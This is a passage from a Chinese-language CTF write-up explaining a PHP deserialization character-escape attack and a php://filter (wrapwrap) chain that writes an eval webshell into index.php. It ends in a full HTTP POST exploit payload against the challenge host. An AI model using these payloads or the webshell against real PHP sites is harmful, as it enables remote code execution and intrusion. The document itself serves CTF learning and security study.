class="hljs-variable">$c</span>);<br></code></pre></td></tr></table></figure><p>第二个就是空字节的问题了, 原本的空字节会被替换成 <code>00</code>, 导致我们 <code>$a</code> 的 <code>key</code> 中的 <code>\0</code> 误伤, 此时我们可以采用 <code>转义字符串 (S)</code> 来进行处理, 使用 <code>S:5:&quot;\00key\00&quot;;</code> 来进行绕过</p><p>所以最终的后半段如下:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">&quot;;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;str&quot;</span>;O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;B&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;b&quot;</span>;<span class="hljs-selector-tag">a</span>:<span class="hljs-number">2</span>:&#123;<span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>;O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;A&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;key&quot;</span>;S:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;\00key\00&quot;</span>;&#125;<span class="hljs-selector-tag">i</span>:<span class="hljs-number">1</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;readflag&quot;</span>;&#125;&#125;&#125;<br></code></pre></td></tr></table></figure><p>他的长度刚好为 100, 根据字符逃逸, 长度增长了 2 倍, 于是我们在前面加上 100 个空字节</p><p>最终的 <code>c</code> 为</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%73</span><span class="hljs-variable">%3</span>a<span class="hljs-variable">%33</span><span class="hljs-variable">%3</span>a<span class="hljs-variable">%22</span><span class="hljs-variable">%73</span><span class="hljs-variable">%74</span><span class="hljs-variable">%72</span><span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%4</span>f<span class="hljs-variable">%3</span>a<span class="hljs-variable">%31</span><span class="hljs-variable">%3</span>a<span class="hljs-variable">%22</span><span class="hljs-variable">%42</span><span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>a<span class="hljs-variable">%31</span><span class="hljs-variable">%3</span>a<span class="hljs-variable">%7</span>b<span class="hljs-variable">%73</span><span class="hljs-variable">%3</span>a<span class="hljs-variable">%31</span><span class="hljs-variable">%3</span>a<span class="hljs-variable">%22</span><span class="hljs-variable">%62</span><span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%61</span><span class="hljs-variable">%3</span>a<span class="hljs-variable">%32</span><span class="hljs-variable">%3</span>a<span class="hljs-variable">%7</span>b<span class="hljs-variable">%69</span><span class="hljs-variable">%3</span>a<span class="hljs-variable">%30</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%4</span>f<span class="hljs-variable">%3</span>a<span class="hljs-variable">%31</span><span class="hljs-variable">%3</span>a<span class="hljs-variable">%22</span><span class="hljs-variable">%41</span><span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>a<span class="hljs-variable">%31</span><span class="hljs-variable">%3</span>a<span class="hljs-variable">%7</span>b<span class="hljs-variable">%73</span><span class="hljs-variable">%3</span>a<span class="hljs-variable">%33</span><span class="hljs-variable">%3</span>a<span class="hljs-variable">%22</span><span class="hljs-variable">%6</span>b<span class="hljs-variable">%65</span><span class="hljs-variable">%79</span><span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%53</span><span class="hljs-variable">%3</span>a<span class="hljs-variable">%35</span><span class="hljs-variable">%3</span>a<span class="hljs-variable">%22</span><span class="hljs-variable">%5</span><span class="hljs-keyword">c</span><span class="hljs-variable">%30</span><span class="hljs-variable">%30</span><span class="hljs-variable">%6</span>b<span class="hljs-variable">%65</span><span class="hljs-variable">%79</span><span class="hljs-variable">%5</span><span class="hljs-keyword">c</span><span class="hljs-variable">%30</span><span class="hljs-variable">%30</span><span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%7</span>d<span class="hljs-variable">%69</span><span class="hljs-variable">%3</span>a<span class="hljs-variable">%31</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%73</span><span class="hljs-variable">%3</span>a<span class="hljs-variable">%38</span><span class="hljs-variable">%3</span>a<span class="hljs-variable">%22</span><span class="hljs-variable">%72</span><span class="hljs-variable">%65</span><span class="hljs-variable">%61</span><span class="hljs-variable">%64</span><span class="hljs-variable">%66</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%61</span><span class="hljs-variable">%67</span><span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%7</span>d<span class="hljs-variable">%7</span>d<span class="hljs-variable">%7</span>d<br></code></pre></td></tr></table></figure><p>第三个考点是 <code>PHP 伪协议</code>, 这个玩意儿被玩烂了, 也被研究烂了, 出题人出 <code>wrapwrap</code> 这种烂掉牙的考点也不好评价.</p><p>我们我们可以看到这个地方先读取了文件内容, 再把这个内容写到了文件里面, 一眼 <code>wrapwrap</code></p><blockquote><p><a href="https://github.com/ambionics/wrapwrap">wrapwrap</a> 可以通过过滤器链给已知文件内容的文件加上指定前缀和后缀</p></blockquote><p>我们利用在 <code>index.php</code> 这个已知内容的文件来前缀上 <code>&lt;?php eval($_POST[0]); ?&gt;</code> 这个一句话, 但是文件尾很容易写脏, 这边用了一个技巧, 我先把原本的 <code>index.php</code> 给进行 base64 编码, 吞掉他的 php 标签, 再进行前缀, 利用 wrapwrap:</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">python .\wrapwrap.py path_to_base64_encoded_index_php &quot;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(`<span class="hljs-variable">$_POST</span>[<span class="hljs-number">0</span>]); <span class="hljs-meta">?&gt;</span></span><span class="language-xml">&quot; &quot;&quot; 1000</span><br></code></pre></td></tr></table></figure><p>得到:</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq">convert.base64-encode|<span class="hljs-type">convert</span>.iconv<span class="hljs-number">.855</span>.UTF7|<span class="hljs-type">convert</span>.iconv.CP869.UTF<span class="hljs-number">-32</span>|<span class="hljs-type">convert</span>.iconv.MACUK.UCS4|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv<span class="hljs-number">.855</span>.UTF7|<span class="hljs-type">convert</span>.iconv.ISO88597.UTF16|<span class="hljs-type">convert</span>.iconv.RK1048.UCS<span class="hljs-number">-4</span>LE|<span class="hljs-type">convert</span>.iconv.UTF32.CP1167|<span class="hljs-type">convert</span>.iconv.CP9066.CSUCS4|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv<span class="hljs-number">.855</span>.UTF7|<span class="hljs-type">convert</span>.iconv.JS.UNICODE|<span class="hljs-type">convert</span>.iconv.L4.UCS2|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv<span class="hljs-number">.855</span>.UTF7|<span class="hljs-type">convert</span>.iconv.SE2.UTF<span class="hljs-number">-16</span>|<span class="hljs-type">convert</span>.iconv.CSIBM1161.IBM<span class="hljs-number">-932</span>|<span class="hljs-type">convert</span>.iconv.MS932.MS936|<span class="hljs-type">convert</span>.iconv.BIG5.JOHAB|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv<span class="hljs-number">.855</span>.UTF7|<span class="hljs-type">convert</span>.iconv.IBM869.UTF16|<span class="hljs-type">convert</span>.iconv.L3.CSISO90|<span class="hljs-type">convert</span>.iconv.UCS2.UTF<span class="hljs-number">-8</span>|<span class="hljs-type">convert</span>.iconv.CSISOLATIN6.UCS<span class="hljs-number">-4</span>|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv<span class="hljs-number">.855</span>.UTF7|<span class="hljs-type">convert</span>.iconv<span class="hljs-number">.8859</span>_3.UTF16|<span class="hljs-type">convert</span>.iconv<span class="hljs-number">.863</span>.SHIFT_JISX0213|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv<span class="hljs-number">.855</span>.UTF7|<span class="hljs-type">convert</span>.iconv<span class="hljs-number">.851</span>.UTF<span class="hljs-number">-16</span>|<span class="hljs-type">convert</span>.iconv.L1.T<span class="hljs-number">.618</span>BIT|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv<span class="hljs-number">.855</span>.UTF7|<span class="hljs-type">convert</span>.iconv.CSA_T500.UTF<span class="hljs-number">-32</span>|<span class="hljs-type">convert</span>.iconv.CP857.ISO<span class="hljs-number">-2022</span>-JP<span class="hljs-number">-3</span>|<span class="hljs-type">convert</span>.iconv.ISO2022JP2.CP775|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv<span class="hljs-number">.855</span>.UTF7|<span class="hljs-type">convert</span>.iconv.IBM891.CSUNICODE|<span class="hljs-type">convert</span>.iconv.ISO8859<span class="hljs-number">-14.</span>ISO6937|<span class="hljs-type">convert</span>.iconv.BIG-FIVE.UCS<span class="hljs-number">-4</span>|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv<span class="hljs-number">.855</span>.UTF7|<span class="hljs-type">convert</span>.iconv.UTF8.UTF16LE|<span class="hljs-type">convert</span>.iconv.UTF8.CSISO2022KR|<span class="hljs-type">convert</span>.iconv.UCS2.UTF8|<span class="hljs-type">convert</span>.iconv<span class="hljs-number">.8859</span>_3.UCS2|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv<span class="hljs-number">.855</span>.UTF7|<span class="hljs-type">convert</span>.iconv.L5.UTF<span class="hljs-number">-32</span>|<span class="hljs-type">convert</span>.iconv.ISO88594.GB13000|<span class="hljs-type">convert</span>.iconv.CP950.SHIFT_JISX0213|<span class="hljs-type">convert</span>.iconv.UHC.JOHAB|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv<span class="hljs-number">.855</span>.UTF7|<span class="hljs-type">convert</span>.iconv.CP869.UTF<span class="hljs-number">-32</span>|<span class="hljs-type">convert</span>.iconv.MACUK.UCS4|<span class="hljs-type">convert</span>.iconv.UTF16BE<span class="hljs-number">.866</span>|<span class="hljs-type">convert</span>.iconv.MACUKRAINIAN.WCHAR_T|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv<span class="hljs-number">.855</span>.UTF7|<span class="hljs-type">convert</span>.iconv.JS.UNICODE|<span class="hljs-type">convert</span>.iconv.L4.UCS2|<span class="hljs-type">convert</span>.iconv.UCS<span class="hljs-number">-2.</span>OSF00030010|<span class="hljs-type">convert</span>.iconv.CSIBM1008.UTF32BE|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv<span class="hljs-number">.855</span>.UTF7|<span class="hljs-type">convert</span>.iconv.PT.UTF32|<span class="hljs-type">convert</span>.iconv.KOI8-U.IBM<span class="hljs-number">-932</span>|<span class="hljs-type">convert</span>.iconv.SJIS.EUCJP-WIN|<span class="hljs-type">convert</span>.iconv.L10.UCS4|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv<span class="hljs-number">.855</span>.UTF7|<span class="hljs-type">convert</span>.iconv.ISO88597.UTF16|<span class="hljs-type">convert</span>.iconv.RK1048.UCS<span class="hljs-number">-4</span>LE|<span class="hljs-type">convert</span>.iconv.UTF32.CP1167|<span class="hljs-type">convert</span>.iconv.CP9066.CSUCS4|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv<span class="hljs-number">.855</span>.UTF7|<span class="hljs-type">convert</span>.iconv.INIS.UTF16|<span class="hljs-type">convert</span>.iconv.CSIBM1133.IBM943|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv<span class="hljs-number">.855</span>.UTF7|<span class="hljs-type">convert</span>.iconv.SE2.UTF<span class="hljs-number">-16</span>|<span class="hljs-type">convert</span>.iconv.CSIBM1161.IBM<span class="hljs-number">-932</span>|<span class="hljs-type">convert</span>.iconv.MS932.MS936|<span class="hljs-type">convert</span>.iconv.BIG5.JOHAB|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv<span class="hljs-number">.855</span>.UTF7|<span class="hljs-type">convert</span>.iconv.CP861.UTF<span class="hljs-number">-16</span>|<span class="hljs-type">convert</span>.iconv.L4.GB13000|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv<span class="hljs-number">.855</span>.UTF7|<span class="hljs-type">convert</span>.iconv.ISO88597.UTF16|<span class="hljs-type">convert</span>.iconv.RK1048.UCS<span class="hljs-number">-4</span>LE|<span class="hljs-type">convert</span>.iconv.UTF32.CP1167|<span class="hljs-type">convert</span>.iconv.CP9066.CSUCS4|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv<span class="hljs-number">.855</span>.UTF7|<span class="hljs-type">convert</span>.iconv.PT.UTF32|<span class="hljs-type">convert</span>.iconv.KOI8-U.IBM<span class="hljs-number">-932</span>|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv<span class="hljs-number">.855</span>.UTF7|<span class="hljs-type">convert</span>.iconv.JS.UNICODE|<span class="hljs-type">convert</span>.iconv.L4.UCS2|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv<span class="hljs-number">.855</span>.UTF7|<span class="hljs-type">convert</span>.iconv.SE2.UTF<span class="hljs-number">-16</span>|<span class="hljs-type">convert</span>.iconv.CSIBM921.NAPLPS|<span class="hljs-type">convert</span>.iconv<span class="hljs-number">.855</span>.CP936|<span class="hljs-type">convert</span>.iconv.IBM<span class="hljs-number">-932.</span>UTF<span class="hljs-number">-8</span>|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv<span class="hljs-number">.855</span>.UTF7|<span class="hljs-type">convert</span>.iconv.UTF8.CSISO2022KR|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv<span class="hljs-number">.855</span>.UTF7|<span class="hljs-type">convert</span>.iconv.JS.UNICODE|<span class="hljs-type">convert</span>.iconv.L4.UCS2|<span class="hljs-type">convert</span>.iconv.UCS<span class="hljs-number">-2.</span>OSF00030010|<span class="hljs-type">convert</span>.iconv.CSIBM1008.UTF32BE|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv<span class="hljs-number">.855</span>.UTF7|<span class="hljs-type">convert</span>.iconv.CSGB2312.UTF<span class="hljs-number">-32</span>|<span class="hljs-type">convert</span>.iconv.IBM<span class="hljs-number">-1161.</span>IBM932|<span class="hljs-type">convert</span>.iconv.GB13000.UTF16BE|<span class="hljs-type">convert</span>.iconv<span class="hljs-number">.864</span>.UTF<span class="hljs-number">-32</span>LE|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv<span class="hljs-number">.855</span>.UTF7|<span class="hljs-type">convert</span>.iconv.SE2.UTF<span class="hljs-number">-16</span>|<span class="hljs-type">convert</span>.iconv.CSIBM1161.IBM<span class="hljs-number">-932</span>|<span class="hljs-type">convert</span>.iconv.BIG5HKSCS.UTF16|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv<span class="hljs-number">.855</span>.UTF7|<span class="hljs-type">convert</span>.iconv.PT.UTF32|<span class="hljs-type">convert</span>.iconv.KOI8-U.IBM<span class="hljs-number">-932</span>|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv<span class="hljs-number">.855</span>.UTF7|<span class="hljs-type">convert</span>.iconv.SE2.UTF<span class="hljs-number">-16</span>|<span class="hljs-type">convert</span>.iconv.CSIBM1161.IBM<span class="hljs-number">-932</span>|<span class="hljs-type">convert</span>.iconv.BIG5HKSCS.UTF16|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv<span class="hljs-number">.855</span>.UTF7|<span class="hljs-type">convert</span>.iconv.SE2.UTF<span class="hljs-number">-16</span>|<span class="hljs-type">convert</span>.iconv.CSIBM921.NAPLPS|<span class="hljs-type">convert</span>.iconv<span class="hljs-number">.855</span>.CP936|<span class="hljs-type">convert</span>.iconv.IBM<span class="hljs-number">-932.</span>UTF<span class="hljs-number">-8</span>|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv<span class="hljs-number">.855</span>.UTF7|<span class="hljs-type">convert</span>.iconv<span class="hljs-number">.8859</span>_3.UTF16|<span class="hljs-type">convert</span>.iconv<span class="hljs-number">.863</span>.SHIFT_JISX0213|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv<span class="hljs-number">.855</span>.UTF7|<span class="hljs-type">convert</span>.iconv.CP1046.UTF16|<span class="hljs-type">convert</span>.iconv.ISO6937.SHIFT_JISX0213|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv<span class="hljs-number">.855</span>.UTF7|<span class="hljs-type">convert</span>.iconv.CP1046.UTF32|<span class="hljs-type">convert</span>.iconv.L6.UCS<span class="hljs-number">-2</span>|<span class="hljs-type">convert</span>.iconv.UTF<span class="hljs-number">-16</span>LE.T<span class="hljs-number">.61</span><span class="hljs-number">-8</span>BIT|<span class="hljs-type">convert</span>.iconv<span class="hljs-number">.865</span>.UCS<span class="hljs-number">-4</span>LE|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv<span class="hljs-number">.855</span>.UTF7|<span class="hljs-type">convert</span>.iconv.MAC.UTF16|<span class="hljs-type">convert</span>.iconv.L8.UTF16BE|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv<span class="hljs-number">.855</span>.UTF7|<span class="hljs-type">convert</span>.iconv.CSIBM1161.UNICODE|<span class="hljs-type">convert</span>.iconv.ISO-IR<span class="hljs-number">-156.</span>JOHAB|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv<span class="hljs-number">.855</span>.UTF7|<span class="hljs-type">convert</span>.iconv.INIS.UTF16|<span class="hljs-type">convert</span>.iconv.CSIBM1133.IBM943|<span class="hljs-type">convert</span>.iconv.IBM932.SHIFT_JISX0213|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv<span class="hljs-number">.855</span>.UTF7|<span class="hljs-type">convert</span>.iconv.SE2.UTF<span class="hljs-number">-16</span>|<span class="hljs-type">convert</span>.iconv.CSIBM1161.IBM<span class="hljs-number">-932</span>|<span class="hljs-type">convert</span>.iconv.MS932.MS936|<span class="hljs-type">convert</span>.iconv.BIG5.JOHAB|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv<span class="hljs-number">.855</span>.UTF7|<span class="hljs-type">convert</span>.base64-decode<br></code></pre></td></tr></table></figure><p>手动在最开始加上:</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">conver.<span class="hljs-built_in">base64</span>-encode<br></code></pre></td></tr></table></figure><p><strong>最终 Payload:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs yak">POST /?c=&#123;&#123;repeat:str(&#123;&#123;url(&#123;&#123;nullbyte()&#125;&#125;)&#125;&#125;|100)&#125;&#125;%22%3b%73%3a%33%3a%22%73%74%72%22%3b%4f%3a%31%3a%22%42%22%3a%31%3a%7b%73%3a%31%3a%22%62%22%3b%61%3a%32%3a%7b%69%3a%30%3b%4f%3a%31%3a%22%41%22%3a%31%3a%7b%73%3a%33%3a%22%6b%65%79%22%3b%53%3a%35%3a%22%5c%30%30%6b%65%79%5c%30%30%22%3b%7d%69%3a%31%3b%73%3a%38%3a%22%72%65%61%64%66%6c%61%67%22%3b%7d%7d%7d&amp;nep1=%f0abc%f0abc%f0abc%f0%9f%9fa&amp;nep=Nep HTTP/1.1<br>Host: neptune-44355.nepctf.lemonprefect.cn<br>LHost: localhost:32768<br>Content-Type: application/x-www-form-urlencoded<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36<br><br>1=php://filter/write=convert.base64-encode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IB